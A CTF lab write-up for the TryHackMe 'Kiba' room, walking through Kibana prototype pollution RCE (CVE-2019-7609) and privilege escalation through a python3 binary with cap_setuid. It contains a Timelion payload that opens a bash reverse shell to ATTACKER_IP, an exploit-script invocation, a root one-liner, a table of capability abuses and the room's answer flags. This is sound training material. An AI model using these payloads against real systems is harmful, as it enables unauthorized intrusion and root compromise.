# Kiba — TryHackMe Writeup

**Author:** Artem  
**Platform:** TryHackMe  
**Room:** Kiba  
**Difficulty:** Easy  
**Date:** 2026-05-19  
**Tags:** Kibana, Prototype Pollution, CVE-2019-7609, Timelion RCE, Linux Capabilities, cap_setuid, Node.js

---

## Overview

This room introduces two techniques that are new to my toolkit: **Prototype Pollution** (a JavaScript-specific vulnerability leading to RCE via Kibana's Timelion visualizer) and **Linux Capabilities** as a privilege escalation vector. The attack chain exploits CVE-2019-7609 in Kibana 6.5.4 to get a reverse shell, then abuses a python3 binary with `cap_setuid+ep` to escalate to root.

- **User flag:** `THM{1s_easy_pwn3d_k1bana_w1th_rce}`
- **Root flag:** `THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}`

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -O -p- 10.66.169.161
```

Key results:

| Port | Service | Version / Notes |
|------|---------|-----------------|
| 22   | SSH     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80   | HTTP    | Apache 2.4.18 (Ubuntu) — ASCII art page with hint: "Welcome, linux capabilities" |
| 5044 | lxi-evntsvc? | Logstash Beats input — part of ELK stack, not directly exploitable |
| 5601 | esmagent? | **Kibana** — identified via response headers (`kbn-name: kibana`) |

**Observation:** Nmap failed to auto-identify the service on port 5601 (showed `esmagent?` with a question mark). However, the fingerprint-strings section revealed HTTP response headers containing `kbn-name: kibana` and `kbn-xpack-sig`, which unambiguously identify it as Kibana. The `?` after a service name means nmap's probe matching was inconclusive — always read the raw fingerprint data in such cases.

**How nmap fingerprint-strings work:** When nmap can't identify a service by banner, it sends protocol-specific probes (DNS, Kerberos, LDAP, SMB, SSL, etc.) and records the responses. All non-HTTP probes returned `HTTP/1.1 400 Bad Request` (expected — Kibana is an HTTP server), while HTTP probes (`GetRequest`, `FourOhFourRequest`) returned proper JSON responses with Kibana headers.

### Web Enumeration — Port 80

The web page on port 80 displayed ASCII art and the message: "Welcome, linux capabilities". This is a deliberate hint for the privilege escalation phase — not useful for initial access.

Directory enumeration (gobuster) found nothing useful here — the real target is port 5601.

### Kibana — Port 5601

Navigating to `http://10.66.169.161:5601/app/kibana` opened the Kibana dashboard.

**Version discovery:** Found in Management tab (bottom of left sidebar): **Kibana 6.5.4**. Also visible in the `elasticsearch-6.5.4.deb` file in kiba's home directory after shell access.

Alternative method: Dev Tools console → `GET /` → version field in JSON response.

---

## Vulnerability Research

### Question Answers

1. **Vulnerability specific to prototype-based inheritance languages:** `Prototype pollution`
2. **Kibana version:** `6.5.4`
3. **CVE:** `CVE-2019-7609`

### What is Prototype Pollution?

In JavaScript, objects inherit properties through a **prototype chain**. Every object has a `__proto__` link to its prototype. `Object.prototype` sits at the top of the chain — it's the shared ancestor of almost all objects.

**Prototype Pollution** occurs when an attacker can write properties to `Object.prototype` through user input (typically via unsafe merge/clone/extend functions). Once polluted, the injected property appears on **every** object in the application.

```javascript
// Unsafe merge function (common in libraries like old lodash, jQuery)
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// Attacker sends: {"__proto__": {"isAdmin": true}}
let malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, malicious);

// Now ALL objects inherit isAdmin:
let user = {};
console.log(user.isAdmin); // true — polluted!
```

This is specific to **prototype-based languages** (JavaScript, Lua, Io) because they use a shared, mutable prototype chain. In class-based languages (Java, C#, Python), you can't modify the behavior of all objects at runtime through user input.

### CVE-2019-7609 — Prototype Pollution to RCE in Kibana

Kibana's **Timelion** visualizer parses user-supplied expressions without sanitizing access to `__proto__`. The exploit chain:

1. **Poison the prototype** via Timelion expression → writes `env.AAAA` (containing a `require("child_process").exec(...)` payload) and `env.NODE_OPTIONS` (set to `--require /proc/self/environ`) into `Object.prototype`
2. **Trigger a new Node.js process** (e.g., navigating to Canvas) → the child process inherits the poisoned environment variables
3. Node.js reads `NODE_OPTIONS=--require /proc/self/environ` → loads `/proc/self/environ` as a JS module → the `AAAA=require("child_process").exec(...)` string executes as code → **reverse shell**

Affected versions: Kibana < 6.6.1. Fixed by sanitizing prototype access in Timelion expression parsing.

---

## Exploitation — Initial Access

### Setting Up the Listener

```bash
nc -lvnp 4444
```

### Timelion Payload (Manual Method)

Navigated to Timelion (`http://10.66.169.161:5601/app/timelion`) and entered:

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

Clicked **Run** (▶), then navigated to **Canvas** in the left sidebar to trigger a new Node.js process.

### Alternative: Python Exploit

```bash
git clone https://github.com/LandGrey/CVE-2019-7609
python3 exploit.py http://10.66.169.161:5601 ATTACKER_IP 4444
```

### Shell Received

```
kiba@ubuntu:/home/kiba/kibana/bin$ id
uid=1000(kiba) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

### User Flag

```bash
cat /home/kiba/user.txt
THM{1s_easy_pwn3d_k1bana_w1th_rce}
```

---

## Privilege Escalation — Linux Capabilities

### Enumeration

The hint from port 80 ("linux capabilities") pointed to this vector.

```bash
getcap -r / 2>/dev/null
```

- `getcap` — reads file capabilities (extended attributes)
- `-r` — recursive search from root
- `2>/dev/null` — suppress "Permission denied" errors

Results:

```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

### The Vulnerable Binary

`/home/kiba/.hackmeplease/python3` has `cap_setuid+ep`:

- **cap_setuid** — allows changing the effective user ID (can become UID 0 / root)
- **+e** (effective) — capability is active immediately on execution
- **+p** (permitted) — capability is allowed to be used

**Important clarification:** This python3 binary has nothing to do with Kibana or Node.js. It's a separate copy of the Python interpreter placed in a hidden directory (`.hackmeplease`) with the `cap_setuid` capability assigned via `setcap`. Someone (in CTF context: the room author) intentionally set this up. Any user who can execute this file gains the ability to change their UID.

### Capabilities vs SUID

| Aspect | SUID | Capabilities |
|--------|------|-------------|
| Discovery | `find / -perm -4000 2>/dev/null` | `getcap -r / 2>/dev/null` |
| Scope | Runs entire binary as file owner (usually root) | Grants specific privilege(s) only |
| Granularity | All-or-nothing root | Fine-grained (~40 individual caps) |
| Privesc risk | Any SUID root binary with shell escape | `cap_setuid`, `cap_dac_override`, `cap_sys_admin` are near-equivalent to root |

In practice, `cap_setuid` is just as dangerous as SUID root — one capability is enough for full escalation.

### Exploitation

```bash
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

1. `os.setuid(0)` — changes effective UID to 0 (root). Normally this would fail with "Operation not permitted", but `cap_setuid` allows it.
2. `os.system("/bin/bash")` — spawns a bash shell as root.

### Root Flag

```bash
whoami
root
cat /root/root.txt
THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
```

---

## Dangerous Capabilities Reference

| Capability | Risk | Exploitation |
|-----------|------|-------------|
| cap_setuid | Change UID → root | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| cap_setgid | Change GID → root group | Similar to setuid but with group |
| cap_dac_override | Read/write any file | Read `/etc/shadow`, write to `/etc/passwd` |
| cap_dac_read_search | Read any file | Exfiltrate sensitive files |
| cap_sys_admin | Mount, BPF, many operations | Near full root — mount filesystems, escape containers |
| cap_sys_ptrace | Attach to any process | Inject code into root processes |
| cap_net_raw | Raw sockets | Sniff network traffic |
| cap_fowner | Change file ownership | Take ownership of sensitive files |

GTFOBins covers capabilities — filter by capability for each binary.

---

## Mistakes & Lessons Learned

### What Went Well

- **Full port scan from the start.** Previous rooms taught me that limiting to top-1000 ports misses non-standard services. Port 5601 was critical here.
- **Reading nmap fingerprint-strings.** When auto-detection failed (`esmagent?`), the raw HTTP headers (`kbn-name: kibana`) immediately identified the service.
- **Following the breadcrumb.** The "linux capabilities" hint on port 80 was a direct pointer to the privesc vector.

### Key Takeaways

1. **Prototype Pollution is a first-class RCE vector.** Not just a theoretical JS quirk — in Kibana it chains to full remote code execution via `NODE_OPTIONS` environment variable injection. Any Node.js application with unsafe merge/clone on user input is potentially vulnerable.

2. **Linux Capabilities are an often-overlooked privesc vector.** `getcap -r / 2>/dev/null` should be part of every Linux privesc checklist alongside `find / -perm -4000`, `sudo -l`, and cron enumeration. `cap_setuid` is effectively equivalent to SUID root.

3. **Capabilities ≠ Kibana.** The `.hackmeplease/python3` binary was an independent misconfiguration, not related to the Kibana exploit. In real engagements, privilege escalation vectors are often completely unrelated to the initial access vector.

4. **`nmap -sV` fingerprint-strings are underrated.** When the service probe database doesn't match, the raw responses often contain enough information for manual identification (custom headers, JSON responses, protocol-specific strings).

---

## MITRE ATT&CK TTPs

| Tactic | Technique | ID | Details |
|--------|-----------|-----|---------|
| Reconnaissance | Active Scanning: Service Version | T1046 | nmap -sC -sV -p- identified Kibana on 5601 |
| Initial Access | Exploit Public-Facing Application | T1190 | CVE-2019-7609 Prototype Pollution in Kibana Timelion |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | Reverse shell via bash -i |
| Execution | Command and Scripting Interpreter: Python | T1059.006 | python3 -c with os.setuid(0) |
| Discovery | Software Discovery | T1518 | Kibana version via Management tab |
| Discovery | Process Discovery | T1057 | getcap -r / to enumerate capabilities |
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548 | cap_setuid on python3 binary |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 | os.setuid(0) via cap_setuid capability |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Full port scan + service/version detection |
| Browser | Kibana dashboard access, Timelion payload delivery |
| netcat (nc) | Reverse shell listener |
| getcap | Linux capabilities enumeration |
| python3 (on target) | Privilege escalation via cap_setuid |

---

## References

- [CVE-2019-7609 — Prototype Pollution RCE in Kibana (Securitum)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
- [Prototype Pollution Explained (GitHub)](https://github.com/Kirill89/prototype-pollution-explained)
- [CVE-2019-7609 Exploit (LandGrey)](https://github.com/LandGrey/CVE-2019-7609)
- [CVE-2019-7609 Payloads (mpgn)](https://github.com/mpgn/CVE-2019-7609)
- [Linux Capabilities — HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
- [GTFOBins — Capabilities](https://gtfobins.github.io/)
